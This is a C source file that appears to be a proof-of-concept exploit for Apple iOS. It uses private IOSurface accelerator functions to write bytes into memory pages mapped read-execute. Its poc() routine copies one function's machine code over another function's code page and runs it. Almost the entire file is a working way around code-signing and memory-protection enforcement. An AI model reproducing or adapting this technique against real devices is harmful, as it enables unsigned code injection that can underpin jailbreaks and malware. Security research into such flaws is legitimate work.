//
//  cs935.c
//  cs935
//
//  Created by tihmstar on 12.05.22.
//

#include "cs935.h"
#include <fcntl.h>
#import <sys/syscall.h>
#import <dlfcn.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld.h>
#include <mach-o/fat.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

kern_return_t mach_vm_remap(vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
static CFStringRef *my_kIOSurfaceBytesPerRow;
static CFStringRef *my_kIOSurfaceWidth;
static CFStringRef *my_kIOSurfaceHeight;
static CFStringRef *my_kIOSurfacePixelFormat;
static uint32_t (*my_IOSurfaceAcceleratorCreate)(CFAllocatorRef allocator, int type, void *outAccelerator);
static void *(*my_IOSurfaceCreate)(CFDictionaryRef properties);
static uint32_t (*my_IOSurfaceAcceleratorTransferSurface)(void *accelerator, void *source, void *dest, CFDictionaryRef, void *);


uint32_t data[0x100] = {
    0x1000//size of executable code mapped R-X, everything after is RW-
};

int testcode(int a, int b);


asm(".align 4");
int doAdd(int a, int b){
    return a+b;
}
int end_doAdd(){
    return 0;
}


void *getData(){
    //first prepare data
    uint8_t *start = (uint8_t*)(((uint64_t)doAdd) & ~1);
    uint8_t *end = (uint8_t*)end_doAdd;
    memcpy(&data[1], start, end-start);
    
    return data;
}

void *memcpy_exec(void *dst, void*src, size_t size){
    //setup
    CFMutableDictionaryRef dict = NULL;
    void* accel = 0;
    {
        int width = PAGE_SIZE / (16*4);
        int height = 16;
        int pitch = width*4;
        char pixelFormat[4] = {'A','R','G','B'};
        dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, *my_kIOSurfaceBytesPerRow, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &pitch));
        CFDictionarySetValue(dict, *my_kIOSurfaceWidth, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &width));
        CFDictionarySetValue(dict, *my_kIOSurfaceHeight, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &height));
        CFDictionarySetValue(dict, *my_kIOSurfacePixelFormat, CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, pixelFormat));
        assert(my_IOSurfaceAcceleratorCreate(kCFAllocatorDefault, 0, &accel) == KERN_SUCCESS);
    }
    
    //transfer pages
    for (uint32_t i=0; i<size; i+= PAGE_SIZE) {
        kern_return_t kr = 0;
        mach_vm_address_t target = ((uint64_t)dst)+i;
        mach_vm_address_t srcaddr = src;

        CFDictionarySetValue(dict, CFSTR("IOSurfaceAddress"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &srcaddr));
        void *srcSurf = my_IOSurfaceCreate(dict);

        mprotect(target, PAGE_SIZE, PROT_READ|PROT_WRITE);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAddress"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &target));
        void *destSurf = my_IOSurfaceCreate(dict);
        mprotect(target, PAGE_SIZE, PROT_READ|PROT_EXEC);
        mlock(target, PAGE_SIZE);

        kr = my_IOSurfaceAcceleratorTransferSurface(accel, srcSurf, destSurf, 0, 0);
        printf("kr2=0x%08x\n",kr);
        assert(kr == 0);

        CFRelease(destSurf);
        CFRelease(srcSurf);
    }
    return dst;
}

void linkIOSurface(){
    void *h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    
    my_kIOSurfaceBytesPerRow = dlsym(h, "kIOSurfaceBytesPerRow");
    my_kIOSurfaceWidth = dlsym(h, "kIOSurfaceWidth");
    my_kIOSurfaceHeight = dlsym(h, "kIOSurfaceHeight");
    my_kIOSurfacePixelFormat = dlsym(h, "kIOSurfacePixelFormat");

    my_IOSurfaceAcceleratorCreate = dlsym(h, "IOSurfaceAcceleratorCreate");
    my_IOSurfaceCreate = dlsym(h, "IOSurfaceCreate");
    my_IOSurfaceAcceleratorTransferSurface = dlsym(h, "IOSurfaceAcceleratorTransferSurface");
}

int main(int,char**);

void poc(void){
    
    linkIOSurface();
    
    uint8_t *tmp = malloc(0x4000);
    uint8_t *start = (uint8_t*)(((uint64_t)doAdd) & ~1);
    memcpy(tmp, start, 0x1000);
        
    uint8_t *finish = (uint8_t*)(((uint64_t)testcode) & ~0xfff);

    memcpy_exec(finish, tmp, 0x1000);

    int (*kkk)(int,int) = (finish+1);
    
    int res = kkk(7,10);
    printf("res = %d\n",res);
    
    printf("");
};

int testcode(int a, int b){
    return 4;
}
